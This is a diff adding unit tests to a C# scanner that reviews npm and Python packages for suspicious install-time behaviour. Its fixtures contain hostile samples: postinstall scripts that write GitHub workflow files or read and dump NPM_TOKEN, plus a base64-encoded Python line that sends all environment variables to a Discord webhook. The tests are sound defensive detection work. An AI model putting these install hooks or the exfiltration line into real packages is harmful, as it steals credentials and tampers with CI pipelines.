@@ -384,6 +384,46 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void Code_that_writes_a_ci_pipeline_file_is_noteworthy_at_install_and_review_when_loaded()
+    {
+        const string write = "const fs = require('fs');\nfs.writeFileSync('.github/workflows/x.yml', 'name: x\\n');\n";
+        var install = Review(Tgz("ci-1.0.0.tgz", ("package/package.json", """{"name":"ci","version":"1.0.0","scripts":{"postinstall":"node setup.js"}}"""), ("package/setup.js", write)));
+        Assert.Contains(install.Findings, f => f is { Rule: "package/ci-config-write", Level: "noteworthy", Path: "package/setup.js" } && f.Detail.EndsWith(".github/workflows/x.yml", StringComparison.Ordinal));
+        var loaded = Review(Tgz("ci-1.0.1.tgz", ("package/package.json", """{"name":"ci","version":"1.0.1","main":"setup.js"}"""), ("package/setup.js", write)));
+        Assert.Contains(loaded.Findings, f => f is { Rule: "package/ci-config-write", Level: "review" });
+        var list = Review(Tgz("ci-1.0.2.tgz", ("package/package.json", """{"name":"ci","version":"1.0.2","main":"index.js"}"""),
+            ("package/index.js", "const fs = require('fs');\nmodule.exports = () => fs.readdirSync('.github/workflows');\n")));
+        Assert.Equal("none", list.Review);
+    }
+
+    [Fact]
+    public void A_postinstall_that_reads_a_publish_token_is_noteworthy_and_a_registry_npmrc_is_not()
+    {
+        var token = Review(Tgz("tok-1.0.0.tgz", ("package/package.json", """{"name":"tok","version":"1.0.0","scripts":{"postinstall":"node setup.js"}}"""),
+            ("package/setup.js", "const t = process.env.NPM_TOKEN;\nmodule.exports = t;\n")));
+        Assert.Contains(token.Findings, f => f is { Rule: "package/credential-files", Level: "noteworthy", Path: "package/setup.js" });
+        var registry = Review(Tgz("reg-1.0.0.tgz", ("package/package.json", """{"name":"reg","version":"1.0.0","main":"index.js"}"""),
+            ("package/.npmrc", "registry=https://registry.npmjs.org/\n"), ("package/index.js", "module.exports = 1;\n")));
+        Assert.Equal("none", registry.Review);
+    }
+
+    [Fact]
+    public void A_joined_workflow_path_written_through_a_variable_at_install_is_noteworthy()
+    {
+        var r = Review(Tgz("ci-1.0.3.tgz", ("package/package.json", """{"name":"ci","version":"1.0.3","scripts":{"postinstall":"node setup.js"}}"""),
+            ("package/setup.js", "const fs = require('fs'), path = require('path');\nconst p = path.join(__dirname, '..', '.github', 'workflows', 'ci.yml');\nfs.writeFileSync(p, 'on: push\\n');\n")));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/ci-config-write", Level: "noteworthy", Path: "package/setup.js" } && f.Detail.Contains("'workflows'", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_shell_file_run_at_install_that_reads_a_publish_token_variable_is_noteworthy()
+    {
+        var r = Review(Tgz("tok-1.0.1.tgz", ("package/package.json", """{"name":"tok","version":"1.0.1","scripts":{"postinstall":"sh setup.sh"}}"""),
+            ("package/setup.sh", "#!/bin/sh\nprintf '%s' \"${NPM_TOKEN}\" > token.txt\n")));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/credential-files", Level: "noteworthy", Path: "package/setup.sh" });
+    }
+
+    [Fact]
     public void A_setup_py_that_replaces_install_and_runs_decoded_code_is_noteworthy()
     {
         var code = Convert.ToBase64String(U("import os, urllib.request\nurllib.request.urlopen('https://discord.com/api/webhooks/1/x', data=str(dict(os.environ)).encode())"));
